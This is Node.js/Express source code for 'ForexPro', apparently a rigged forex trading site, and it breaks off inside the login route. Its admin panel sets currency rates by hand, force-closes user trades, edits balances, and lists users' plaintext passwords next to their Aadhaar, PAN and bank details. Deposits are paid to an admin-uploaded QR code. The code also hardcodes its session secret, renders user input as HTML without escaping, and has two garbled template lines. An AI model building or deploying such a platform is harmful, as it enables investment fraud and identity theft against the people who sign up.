const express = require('express');
const session = require('express-session');
const multer = require('multer');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'forex_master_secret_key_2024',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// ==========================================
// 1. IN-MEMORY DATABASE (With Live Rates)
// ==========================================
const db = {
  users: [
    { id: 1, username: 'demo', password: 'demo123', balance: 10000, equity: 10000, margin: 0, kycStatus: 'Approved', kycData: { email: 'demo@forex.com', aadhar: '000000000000', pan: 'ABCDE1234F', bank: 'SBI - 123456789 - SBIN000123' } }
  ],
  deposits: [],
  withdrawals: [],
  trades: [
    { id: 1, userId: 1, pair: 'EUR/USD', type: 'BUY', amount: 1000, entry: 1.0847, exit: null, pl: 0, status: 'Open' }
  ],
  rates: {
    'EUR/USD': 1.0847,
    'GBP/USD': 1.2634,
    'USD/JPY': 149.82
  },
  settings: {
    qrCodeBuffer: null,
    qrCodeMime: null
  }
};

let nextUserId = 2;
let nextDepId = 1;
let nextWdId = 1;
let nextTradeId = 2;

// Real-time Engine to calculate Equity and P/L dynamically
setInterval(() => {
  Object.keys(db.rates).forEach(pair => {
    const change = (Math.random() - 0.5) * (pair === 'USD/JPY' ? 0.04 : 0.0002);
    db.rates[pair] = parseFloat((db.rates[pair] + change).toFixed(pair === 'USD/JPY' ? 2 : 4));
  });

  db.users.forEach(user => {
    let totalPl = 0;
    let totalMargin = 0;
    
    db.trades.forEach(t => {
      if (t.userId === user.id && t.status === 'Open') {
        const currentRate = db.rates[t.pair];
        let diff = currentRate - t.entry;
        if (t.type === 'SELL') { diff = t.entry - currentRate; }
        
        let multiplier = t.pair === 'USD/JPY' ? 100 : 10000;
        t.pl = parseFloat((diff * (t.amount / t.entry) * multiplier).toFixed(2));
        totalPl += t.pl;
        totalMargin += t.amount;
      }
    });
    
    user.margin = totalMargin;
    user.equity = parseFloat((user.balance + totalPl).toFixed(2));
  });
}, 2000);

// ==========================================
// 2. MIDDLEWARE
// ==========================================
function requireAuth(req, res, next) {
  if (req.session && req.session.userId) return next();
  res.redirect('/');
}

function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  res.redirect('/admin');
}

// ==========================================
// 3. PREMIUM DARK THEME CSS
// ==========================================
const sharedCSS = `
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: #000; color: #fff; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.6; }
.container { max-width: 1200px; margin: 0 auto; padding: 20px; }
.card { background: #121212; border: 1px solid #222; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); transition: 0.3s; }
.card:hover { border-color: #333; }
.btn { padding: 12px 24px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; font-size: 14px; display: inline-block; text-align: center; text-decoration: none; }
.btn-primary { background: #00ff88; color: #000; }
.btn-primary:hover { background: #00cc6a; box-shadow: 0 0 20px rgba(0,255,136,0.4); transform: translateY(-2px); }
.btn-danger { background: #ff3333; color: #fff; }
.btn-danger:hover { background: #cc0000; box-shadow: 0 0 20px rgba(255,51,51,0.4); transform: translateY(-2px); }
.btn-sm { padding: 6px 12px; font-size: 11px; margin-left: 2px; }
input, select, textarea { background: #0a0a0a; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 15px; font-size: 14px; transition: 0.3s; }
input:focus, select:focus, textarea:focus { outline: none; border-color: #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
label { display: block; margin-bottom: 6px; color: #aaa; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
.stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
.stat-card { background: #121212; padding: 20px; border-radius: 12px; border-left: 4px solid #00ff88; transition: 0.3s; }
.stat-card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
.stat-card.loss { border-left-color: #ff3333; }
.stat-label { color: #888; font-size: 12px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
.stat-value { font-size: 24px; font-weight: 700; margin-top: 5px; }
.text-green { color: #00ff88; }
.text-red { color: #ff3333; }
.text-muted { color: #666; }
.navbar { background: rgba(10,10,10,0.95); backdrop-filter: blur(10px); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 100; }
.logo { font-size: 22px; font-weight: 800; color: #00ff88; text-decoration: none; letter-spacing: -0.5px; }
.nav-links a { color: #fff; text-decoration: none; margin-left: 20px; font-weight: 500; transition: 0.3s; }
.nav-links a:hover { color: #00ff88; }
table { width: 100%; border-collapse: collapse; margin-top: 15px; }
th, td { padding: 12px; text-align: left; border-bottom: 1px solid #222; }
th { background: #0a0a0a; color: #888; font-size: 12px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
tr:hover { background: #1a1a1a; }
.badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; text-transform: uppercase; display: inline-block; }
.badge-pending { background: rgba(255, 204, 0, 0.15); color: #ffcc00; border: 1px solid rgba(255, 204, 0, 0.3); }
.badge-approved, .badge-buy { background: rgba(0, 255, 136, 0.15); color: #00ff88; border: 1px solid rgba(0, 255, 136, 0.3); }
.badge-rejected, .badge-sell { background: rgba(255, 51, 51, 0.15); color: #ff3333; border: 1px solid rgba(255, 51, 51, 0.3); }
.ticker { background: #0a0a0a; padding: 10px 0; overflow: hidden; white-space: nowrap; border-bottom: 1px solid #222; }
.ticker-track { display: inline-block; animation: scroll 40s linear infinite; }
@keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
.ticker-item { display: inline-block; margin-right: 40px; font-weight: 600; font-size: 14px; }
.auth-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
.auth-card { background: #121212; padding: 40px; border-radius: 16px; width: 100%; max-width: 420px; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
.auth-title { text-align: center; font-size: 32px; margin-bottom: 10px; color: #00ff88; font-weight: 800; letter-spacing: -1px; }
.auth-subtitle { text-align: center; color: #888; margin-bottom: 30px; font-size: 14px; }
.tabs { display: flex; margin-bottom: 25px; background: #0a0a0a; border-radius: 8px; padding: 4px; }
.tab { flex: 1; text-align: center; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: 600; color: #888; transition: 0.3s; }
.tab.active { background: #00ff88; color: #000; box-shadow: 0 0 15px rgba(0,255,136,0.3); }
.hidden { display: none; }
.qr-box { text-align: center; padding: 20px; background: #0a0a0a; border-radius: 12px; margin-bottom: 20px; border: 1px dashed #333; }
.qr-box img { max-width: 200px; width: 100%; border-radius: 8px; border: 2px solid #00ff88; box-shadow: 0 0 20px rgba(0,255,136,0.2); }
h3 { font-size: 18px; font-weight: 700; margin-bottom: 15px; color: #fff; }
h4 { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #fff; }
.alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: 500; }
.alert-error { background: rgba(255,51,51,0.1); color: #ff3333; border: 1px solid rgba(255,51,51,0.3); }

/* App Navigation Menu styles */
.app-menu { display: flex; gap: 10px; margin-bottom: 20px; }
.menu-btn { flex: 1; background: #121212; border: 1px solid #222; color: #fff; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: 600; text-transform: uppercase; transition: 0.3s; }
.menu-btn:hover { border-color: #00ff88; }
.menu-btn.active { background: #00ff88; color: #000; border-color: #00ff88; box-shadow: 0 0 15px rgba(0,255,136,0.3); }
`;

// ==========================================
// 4. HTML PAGE TEMPLATES
// ==========================================
function getAuthPage(error = '') {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ForexPro - Login</title>
    <style>${sharedCSS}</style>
  </head>
  <body>
    <div class="auth-container">
      <div class="auth-card">
        <h1 class="auth-title">⚡ ForexPro</h1>
        <p class="auth-subtitle">Trade Forex Like a Professional</p>
        ${error ? `<div class="alert alert-error">${error}</div>` : ''}
        <div class="tabs">
          <div class="tab active" onclick="switchTab('login')">Login</div>
          <div class="tab" onclick="switchTab('register')">Register</div>
        </div>
        <form id="loginForm" method="POST" action="/login">
          <label>Username</label>
          <input type="text" name="username" required>
          <label>Password</label>
          <input type="password" name="password" required>
          <button type="submit" class="btn btn-primary" style="width:100%;">Login to Dashboard</button>
        </form>
        <form id="registerForm" method="POST" action="/register" class="hidden">
          <label>Username</label>
          <input type="text" name="username" required>
          <label>Password</label>
          <input type="password" name="password" required>
          <button type="submit" class="btn btn-primary" style="width:100%;">Create Account</button>
        </form>
      </div>
    </div>
    <script>
      function switchTab(tab) {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        if(tab === 'login') {
          document.querySelectorAll('.tab')[0].classList.add('active');
          document.getElementById('loginForm').classList.remove('hidden');
          document.getElementById('registerForm').classList.add('hidden');
        } else {
          document.querySelectorAll('.tab')[1].classList.add('active');
          document.getElementById('loginForm').classList.add('hidden');
          document.getElementById('registerForm').classList.remove('hidden');
        }
      }
    </script>
  </body>
  </html>`;
}

function getDashboardPage() {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - ForexPro</title>
    <style>${sharedCSS}</style>
  </head>
  <body>
    <nav class="navbar">
      <a href="/dashboard" class="logo">⚡ ForexPro</a>
      <div class="nav-links">
        <a href="/logout">Logout</a>
      </div>
    </nav>
    
    <div class="ticker">
      <div class="ticker-track" id="tickerTrack"></div>
    </div>

    <div class="container">
      
      <div class="app-menu">
        <button class="menu-btn active" id="btn-kyc" onclick="showStep('kyc')">📋 Profile & KYC</button>
        <button class="menu-btn" id="btn-trading" onclick="showStep('trading')">📈 Trading Desk</button>
        <button class="menu-btn" id="btn-banking" onclick="showStep('banking')">🏦 Banking & History</button>
      </div>

      <div id="step-kyc" class="app-step-section">
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-label">Wallet Balance</div>
            <div class="stat-value text-green" id="balance">$0.00</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Equity</div>
            <div class="stat-value" id="equity">$0.00</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Active Margin</div>
            <div class="stat-value" id="margin">$0.00</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Account</div>
            <div class="stat-value" id="username" style="font-size:18px;">-</div>
          </div>
        </div>

        <div class="card" id="kycCard" style="border-left: 4px solid #ffcc00;">
          <h3>📋 Mandatory KYC Verification</h3>
          <p id="kycStatusText" style="margin-bottom: 10px; font-weight: 600;"></p>
          <form id="kycForm" class="hidden">
            <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom:0;">
              <div>
                <label>Email ID</label>
                <input type="email" id="kycEmail" placeholder="example@mail.com" required>
              </div>
              <div>
                <label>Aadhaar Card</label>
                <input type="text" id="kycAadhar" placeholder="12-digit Aadhaar" required>
              </div>
              <div>
                <label>PAN Card</label>
                <input type="text" id="kycPan" placeholder="PAN Number" required>
              </div>
            </div>
            <label>Bank Details</label>
            <textarea id="kycBank" placeholder="Account Number, Bank Name, IFSC Code" rows="2" style="background: #0a0a0a; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 15px;" required></textarea>
            <button type="submit" class="btn btn-primary" style="width:100%;">Submit KYC for Approval</button>
          </form>
        </div>
      </div>

      <div id="step-trading" class="app-step-section hidden">
        <div class="card">
          <h3>Live Market Chart</h3>
          <div style="height:580px; border-radius:8px; overflow:hidden; border:1px solid #222; margin-bottom:15px;">
            <div class="tradingview-widget-container" style="height:100%;width:100%">
              <div id="tradingview_chart" style="height:100%;width:100%"></div>
            </div>
          </div>

          <div style="background:#0a0a0a; padding:15px; border-radius:8px; border:1px solid #222;">
            <h4 style="margin-bottom:10px; font-size:14px; text-transform:uppercase; color:#888;">Market Execution</h4>
            <form id="orderForm" style="display:flex; flex-wrap:wrap; gap:10px; align-items:flex-end; margin-bottom:0;">
              <div style="flex:1; min-width:120px;">
                <label style="font-size:11px;">Asset Pair</label>
                <select id="tradePair" style="margin-bottom:0; padding:8px;">
                  <option value="EUR/USD">EUR/USD</option>
                  <option value="GBP/USD">GBP/USD</option>
                  <option value="USD/JPY">USD/JPY</option>
                </select>
              </div>
              <div style="flex:1; min-width:120px;">
                <label style="font-size:11px;">Lot Amount ($)</label>
                <input type="number" id="tradeAmount" value="100" min="10" step="1" style="margin-bottom:0; padding:8px;">
              </div>
              <div style="display:flex; gap:10px;">
                <button type="button" class="btn btn-primary" onclick="placeOrder('BUY')" style="padding:10px 20px;">BUY</button>
                <button type="button" class="btn btn-danger" onclick="placeOrder('SELL')" style="padding:10px 20px;">SELL</button>
              </div>
            </form>
          </div>
        </div>

        <div class="card">
          <h3>Live Active Positions & Trade History</h3>
          <table>
            <thead><tr><th>Pair</th><th>Type</th><th>Amount</th><th>Entry Price</th><th>Live/Exit Price</th><th>P/L</th><th>Status</th><th>Action</th></tr></thead>
            <tbody id="tradesBody"></tbody>
          </table>
        </div>
      </div>

      <div id="step-banking" class="app-step-section hidden">
        <div class="grid">
          <div class="card">
            <h3>Deposit Funds</h3>
            <div class="qr-box">
              <img src="/qr-image" alt="QR Code">
              <p style="margin-top:10px; color:#888; font-size:13px;">Scan to pay, then enter details below</p>
            </div>
            <form id="depositForm">
              <label>Amount (USD)</label>
              <input type="number" id="depAmount" step="0.01" min="1" required>
              <label>UTR / Reference Number</label>
              <input type="text" id="depUtr" required>
              <button type="submit" class="btn btn-primary" style="width:100%;">Submit Deposit Request</button>
            </form>
          </div>

          <div class="card">
            <h3>Withdraw Funds</h3>
            <form id="withdrawForm">
              <label>Amount (USD)</label>
              <input type="number" id="wdAmount" step="0.01" min="1" required>
              <label>Destination Wallet Address</label>
              <input type="text" id="wdWallet" required>
              <button type="submit" class="btn btn-danger" style="width:100%;">Submit Withdrawal Request</button>
            </form>
          </div>
        </div>

        <div class="card">
          <h3>Transaction History</h3>
          <table>
            <thead><tr><th>Type</th><th>Amount</th><th>Details</th><th>Status</th></tr></thead>
            <tbody id="transBody"></tbody>
          </table>
        </div>
      </div>

    </div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
      // Tabs Navigation Control
      function showStep(stepName) {
        document.querySelectorAll('.app-step-section').forEach(sec => sec.classList.add('hidden'));
        document.querySelectorAll('.menu-btn').forEach(btn => btn.classList.remove('active'));
        
        document.getElementById('step-' + stepName).classList.remove('hidden');
        document.getElementById('btn-' + stepName).classList.add('active');
      }

      new TradingView.widget({
        "autosize": true, "symbol": "FX:EURUSD", "interval": "15", "timezone": "Etc/UTC",
        "theme": "dark", "style": "1", "locale": "en", "toolbar_bg": "#000000",
        "enable_publishing": false, "allow_symbol_change": true, "container_id": "tradingview_chart",
        "hide_side_toolbar": false, "backgroundColor": "rgba(0, 0, 0, 1)", "gridColor": "rgba(42, 42, 42, 1)"
      });

      async function loadDashboard() {
        const res = await fetch('/api/user/data');
        const data = await res.json();
        if(!data.success) return window.location.href = '/';
        
        document.getElementById('balance').innerText = '$' + data.user.balance.toFixed(2);
        document.getElementById('equity').innerText = '$' + data.user.equity.toFixed(2);
        document.getElementById('margin').innerText = '$' + data.user.margin.toFixed(2);
        document.getElementById('username').innerText = data.user.username;
        
        const kycCard = document.getElementById('kycCard');
        const kycStatusText = document.getElementById('kycStatusText');
        const kycForm = document.getElementById('kycForm');
        if(data.user.kycStatus === 'Approved') {
          kycCard.style.borderLeftColor = '#00ff88';
          kycStatusText.innerHTML = 'Status: <span class="badge badge-approved">Approved ✅</span> Your account is fully verified.';
          kycForm.classList.add('hidden');
        } else if(data.user.kycStatus === 'Pending') {
          kycCard.style.borderLeftColor = '#ffcc00';
          kycStatusText.innerHTML = 'Status: <span class="badge badge-pending">Pending ⏳</span> KYC details submitted. Awaiting admin approval.';
          kycForm.classList.add('hidden');
        } else if(data.user.kycStatus === 'Rejected') {
          kycCard.style.borderLeftColor = '#ff3333';
          kycStatusText.innerHTML = 'Status: <span class="badge badge-rejected">Rejected ❌</span> Your KYC was rejected. Please re-submit correct details.';
          kycForm.classList.remove('hidden');
        } else {
          kycCard.style.borderLeftColor = '#ffcc00';
          kycStatusText.innerHTML = 'Status: <span class="badge badge-rejected">Not Verified ⚠️</span> Please submit your document details to activate account.';
          kycForm.classList.remove('hidden');
        }

        document.getElementById('tradesBody').innerHTML = data.trades.map(t => `
          <tr>
            <td>\${t.pair}</td>
            <td><span class="badge \${t.type === 'BUY' ? 'badge-buy' : 'badge-sell'}">\${t.type}</span></td>
            <td>$\${t.amount}</td>
            <td>\${t.entry}</td>
            <td>\${t.exit || data.liveRates[t.pair] || '-'}</td>
            <td class="\${t.pl >= 0 ? 'text-green' : 'text-red'}">\$\${t.pl}</td>
            <td><span class="badge \${t.status === 'Open' ? 'badge-pending' : 'badge-approved'}">\${t.status}</span></td>
            <td>
              \${t.status === 'Open' ? `<span class="text-muted" style="font-size:11px; font-style:italic;">Controlled by Admin</span>` : '-'}
            </td>
          </tr>
        `).join('') || '<tr><td colspan="8" class="text-muted" style="text-align:center;">No trades yet</td></tr>';
        
        const trans = [...data.deposits, ...data.withdrawals].sort((a,b) => b.id - a.id);
        document.getElementById('transBody').innerHTML = trans.map(t => `
          <tr>
            <td>\${t.type}</td>
            <td>$\${t.amount}</td>
            <td>\${t.details || '-'}</td>
            <td><span class="badge badge-\${t.status.toLowerCase()}">\${t.status}</span></td>
          </tr>
        `).join('') || '<tr><td colspan="4" class="text-muted" style="text-align:center;">No transactions yet</td></tr>';

        const track = document.getElementById('tickerTrack');
        let html = '';
        for(let i=0; i<2; i++) {
          Object.keys(data.liveRates).forEach(pair => {
            html += `<span class="ticker-item">\${pair} <span class="text-green">\${data.liveRates[pair]}</span></span>`;
          });
        }
        track.innerHTML = html;
      }

      async function placeOrder(orderType) {
        const pair = document.getElementById('tradePair').value;
        const amount = parseFloat(document.getElementById('tradeAmount').value);
        if(!amount || amount <= 0) return alert('Please enter valid amount');
        const res = await fetch('/api/trade/place', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ pair, type: orderType, amount })
        });
        const data = await res.json();
        alert(data.message);
        if(data.success) { loadDashboard(); }
      }

      document.getElementById('kycForm').onsubmit = async (e) => {
        e.preventDefault();
        const email = document.getElementById('kycEmail').value;
        const aadhar = document.getElementById('kycAadhar').value;
        const pan = document.getElementById('kycPan').value;
        const bank = document.getElementById('kycBank').value;
        const res = await fetch('/api/kyc/submit', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({email, aadhar, pan, bank})
        });
        const data = await res.json();
        alert(data.message);
        if(data.success) { loadDashboard(); }
      };

      document.getElementById('depositForm').onsubmit = async (e) => {
        e.preventDefault();
        const amount = document.getElementById('depAmount').value;
        const utr = document.getElementById('depUtr').value;
        const res = await fetch('/api/deposit', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({amount: parseFloat(amount), utr})
        });
        const data = await res.json();
        alert(data.message);
        if(data.success) { e.target.reset(); loadDashboard(); }
      };

      document.getElementById('withdrawForm').onsubmit = async (e) => {
        e.preventDefault();
        const amount = document.getElementById('wdAmount').value;
        const wallet = document.getElementById('wdWallet').value;
        const res = await fetch('/api/withdraw', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({amount: parseFloat(amount), wallet})
        });
        const data = await res.json();
        alert(data.message);
        if(data.success) { e.target.reset(); loadDashboard(); }
      };

      loadDashboard();
      setInterval(loadDashboard, 2000);
    </script>
  </body>
  </html>`;
}

function getAdminLoginPage(error = '') {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - ForexPro</title>
    <style>${sharedCSS}</style>
  </head>
  <body>
    <div class="auth-container">
      <div class="auth-card">
        <h1 class="auth-title">🔐 Admin Access</h1>
        <p class="auth-subtitle">Enter master password to continue</p>
        ${error ? `<div class="alert alert-error">${error}</div>` : ''}
        <form method="POST" action="/admin/login">
          <label>Master Password</label>
          <input type="password" name="password" required>
          <button type="submit" class="btn btn-primary" style="width:100%;">Access Panel</button>
        </form>
        <div style="text-align:center; margin-top:20px;">
          <a href="/" style="color:#888; text-decoration:none;">← Back to Client</a>
        </div>
      </div>
    </div>
  </body>
  </html>`;
}

function getAdminDashboardPage() {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - ForexPro</title>
    <style>${sharedCSS}</style>
  </head>
  <body>
    <nav class="navbar">
      <a href="/admin-panel" class="logo">⚡ Admin Panel</a>
      <div class="nav-links">
        <a href="/logout">Logout</a>
      </div>
    </nav>
    <div class="container">
      <div class="grid" style="grid-template-columns: 1fr 2fr;">
        <div class="card">
          <h3>Currency Rates Control</h3>
          <div id="ratesControlBox"></div>
        </div>
        <div class="card">
          <h3>Payment QR Code Management</h3>
          <div style="display:flex; gap:15px; align-items:center;">
            <div class="qr-box" style="margin-bottom:0; padding:10px;">
              <img src="/qr-image" alt="Current QR" id="currentQr" style="max-width:100px;">
            </div>
            <form id="qrForm" enctype="multipart/form-data" style="flex:1;">
              <label>Select Image</label>
              <input type="file" name="qr" accept="image/*" required>
              <button type="submit" class="btn btn-primary" style="width:100%; padding:8px;">Upload QR</button>
            </form>
          </div>
        </div>
      </div>

      <div class="card">
        <h3>User Database (ID, Passwords, KYC Details & Controls)</h3>
        <table style="font-size: 13px;">
          <thead>
            <tr>
              <th>ID</th>
              <th>Login Info</th>
              <th>Wallet Balance (USD)</th>
              <th>Full KYC Document Details</th>
              <th>KYC Status</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody id="usersBody"></tbody>
        </table>
      </div>

      <div class="card">
        <h3>Active Currency Positions & Force Close</h3>
        <table style="font-size: 13px;">
          <thead>
            <tr>
              <th>Trade ID</th>
              <th>User ID</th>
              <th>Pair</th>
              <th>Type</th>
              <th>Amount</th>
              <th>Entry Price</th>
              <th>P/L</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody id="adminTradesBody"></tbody>
        </table>
      </div>

      <div class="card">
        <h3>Pending Deposit Requests</h3>
        <table>
          <thead><tr><th>Username</th><th>Amount</th><th>UTR</th><th>Actions</th></tr></thead>
          <tbody id="depsBody"></tbody>
        </table>
      </div>

      <div class="card">
        <h3>Pending Withdrawal Requests</h3>
        <table>
          <thead><tr><th>Username</th><th>Amount</th><th>Wallet Address</th><th>Actions</th></tr></thead>
          <tbody id="wdsBody"></tbody>
        </table>
      </div>
    </div>

    <script>
      async function loadAdmin() {
        const res = await fetch('/api/admin/data');
        const data = await res.json();
        if(!data.success) return window.location.href = '/admin';

        let ratesHtml = '';
        Object.keys(data.rates).forEach(pair => {
          ratesHtml += `
            <div style="margin-bottom:10px;">
              <label style="font-size:11px;">\${pair}</label>
              <div style="display:flex; gap:5px;">
                <input type="number" id="rate-\${pair}" step="0.0001" value="\${data.rates[pair]}" style="margin-bottom:0; padding:6px;">
                <button class="btn btn-primary btn-sm" onclick="overrideRate('\${pair}')">Set</button>
              </div>
            </div>`;
        });
        document.getElementById('ratesControlBox').innerHTML = ratesHtml;

        // Render Users inside Admin table with User ID, Passwords, and Full KYC Details
        document.getElementById('usersBody').innerHTML = data.users.map(u => {
          const kyc = u.kycData || {};
          const kycDetailsString = u.kycStatus !== 'Not Verified' ? 
            `<b>Email:</b> \${kyc.email || '-'}<br>
             <b>Aadhaar:</b> \${kyc.aadhar || '-'}<br>
             <b>PAN:</b> \${kyc.pan || '-'}<br>
             <b>Bank:</b> \${kyc.bank || '-'}` : '<span class="text-muted">No details submitted</span>';

          return `
            <tr>
              <td><b>\${u.id}</b></td>
              <td>
                ID: <span class="text-green">\${u.username}</span><br>
                Pass: <span style="color:#ffcc00;">\${u.password}</span>
              </td>
              <td>
                <div style="display:flex; gap:5px; align-items:center;">
                  <span>$\${u.balance.toFixed(2)}</span>
                  <input type="number" id="bal-\${u.id}" placeholder="± Amt" style="width:70px; margin-bottom:0; padding:4px; font-size:11px;">
                  <button class="btn btn-primary btn-sm" onclick="adjustBalance(\${u.id})">Update</button>
                </div>
              </td>
              <td><div style="max-width:320px; word-break:break-word; line-height:1.4;">\${kycDetailsString}</div></td>
              <td><span class="badge badge-\${u.kycStatus.toLowerCase()}">\${u.kycStatus}</span></td>
              <td>
                \${u.kycStatus === 'Pending' ? `
                  <button class="btn btn-primary btn-sm" onclick="verifyKyc(\${u.id}, 'Approved')">Approve</button>
                  <button class="btn btn-danger btn-sm" onclick="verifyKyc(\${u.id}, 'Rejected')">Reject</button>
                ` : '-'}
              </td>
            </tr>`;
        }).join('');

        // Admin Controlled Trade Force Close
        document.getElementById('adminTradesBody').innerHTML = data.trades.filter(t => t.status === 'Open').map(t => `
          <tr>
            <td>#\${t.id}</td>
            <td>User \${t.userId}</td>
            <td><b>\${t.pair}</b></td>
            <td><span class="badge \${t.type === 'BUY' ? 'badge-buy' : 'badge-sell'}">\${t.type}</span></td>
            <td>$\${t.amount}</td>
            <td>\${t.entry}</td>
            <td class="\${t.pl >= 0 ? 'text-green' : 'text-red'}">$\${t.pl}</td>
            <td>
              <button class="btn btn-danger btn-sm" onclick="forceCloseTrade(\${t.id})">Force Close</button>
            </td>
          </tr>
        `).join('') || '<tr><td colspan="8" class="text-muted" style="text-align:center;">No open positions to close</td></tr>';

        document.getElementById('depsBody').innerHTML = data.deposits.filter(d => d.status === 'Pending').map(d => `
          <tr>
            <td>\${d.username}</td>
            <td>$\${d.amount}</td>
            <td><code style="color:#00ff88;">\${d.utr}</code></td>
            <td>
              <button class="btn btn-primary btn-sm" onclick="handleDeposit(\${d.id}, 'approve')">Approve</button>
              <button class="btn btn-danger btn-sm" onclick="handleDeposit(\code{d.id}, 'reject')">Reject</button>
            </td>
          </tr>`).join('') || '<tr><td colspan="4" class="text-muted">No pending deposits</td></tr>';

        document.getElementById('wdsBody').innerHTML = data.withdrawals.filter(w => w.status === 'Pending').map(w => `
          <tr>
            <td>\${w.username}</td>
            <td>$\${w.amount}</td>
            <td><code style="color:#ff3333;">\${w.wallet}</code></td>
            <td>
              <button class="btn btn-primary btn-sm" onclick="handleWithdraw(\\${w.id}, 'approve')">Approve</button>
              <button class="btn btn-danger btn-sm" onclick="handleWithdraw(\${w.id}, 'reject')">Reject</button>
            </td>
          </tr>`).join('') || '<tr><td colspan="4" class="text-muted">No pending withdrawals</td></tr>';
      }

      async function overrideRate(pair) {
        const rate = parseFloat(document.getElementById('rate-'+pair).value);
        await fetch('/api/admin/override-rate', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ pair, rate })
        });
        loadAdmin();
      }

      async function adjustBalance(userId) {
        const amount = parseFloat(document.getElementById('bal-'+userId).value);
        if(!amount) return alert('Enter a valid positive or negative amount');
        await fetch('/api/admin/adjust-balance', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ userId, amount })
        });
        loadAdmin();
      }

      async function verifyKyc(userId, status) {
        await fetch('/api/admin/verify-kyc', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ userId, status })
        });
        loadAdmin();
      }

      async function forceCloseTrade(tradeId) {
        if(!confirm('Force Close this trade position right now?')) return;
        const res = await fetch('/api/trade/close', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ tradeId })
        });
        const d = await res.json();
        alert(d.message);
        loadAdmin();
      }

      async function handleDeposit(id, action) {
        await fetch('/api/admin/deposit/' + action, {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ id })
        });
        loadAdmin();
      }

      async function handleWithdraw(id, action) {
        const route = action === 'approve' ? '/api/admin/approve-withdraw' : '/api/admin/reject-withdraw';
        await fetch(route, {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ id })
        });
        loadAdmin();
      }

      document.getElementById('qrForm').onsubmit = async (e) => {
        e.preventDefault();
        const fd = new FormData(e.target);
        const res = await fetch('/api/admin/upload-qr', { method: 'POST', body: fd });
        const d = await res.json();
        if(d.success) { alert('QR Updated'); document.getElementById('currentQr').src = '/qr-image?' + Date.now(); }
      };

      loadAdmin();
      setInterval(loadAdmin, 3000);
    </script>
  </body>
  </html>`;
}

// ==========================================
// 5. BACKEND API ROUTING & CONTROLLERS
// ==========================================
app.get('/', (req, res) => {
  if (req.session.userId) return res.redirect('/dashboard');
  res.send(getAuthPage());
});

app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.send(getAuthPage('Please fill all fields'));
  const exists = db.users.find(u => u.username.toLowerCase() === username.toLowerCase());
  if (exists) return res.send(getAuthPage('Username already taken'));
  
  db.users.push({
    id: nextUserId++,
    username,
    password,
    balance: 0,
    equity: 0,
    margin: 0,
    kycStatus: 'Not Verified',
    kycData: {}
  });
  res.send(getAuthPage('Account Created! Please Login.'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.users.find(u => u.username === username && u.password === password);
  if (!user) return res.send(getAuthPage('Invalid Credentials'));
  
  req.session.userId = user.id;
